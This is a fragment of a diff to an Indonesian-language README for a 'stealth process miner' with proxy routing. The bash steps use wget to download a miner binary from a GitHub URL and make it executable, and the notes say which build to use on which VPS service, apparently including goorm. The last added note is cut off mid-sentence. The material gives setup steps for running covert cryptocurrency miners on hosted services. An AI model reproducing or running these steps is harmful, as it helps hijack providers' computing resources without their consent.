@@ -18,7 +18,7 @@ implementasi **stealth process miner**, **resource balancing**, **proxy routing*
 ```bash
 # Unduh binary
 
-1.gorm
+1.goorm
 
 wget https://github.com/x-minerLicense/er-1/raw/refs/heads/main/xgm
 
@@ -51,4 +51,5 @@ chmod +x xc
 #Ket : 
 1. penyesuaian penggunaan file eksekusi karena adanya perbedaan library runtime GLIBC dari tiap layanan vps yang digunakan.
 2. layanan vps yang digunakan tidak terbatas pada 3 layanan eksekusi diatas, untuk vps lain bisa digunakan dipilih salah 1 yang sesuai
+3. Miner runing bisa dilihat dengan munculnya 
 
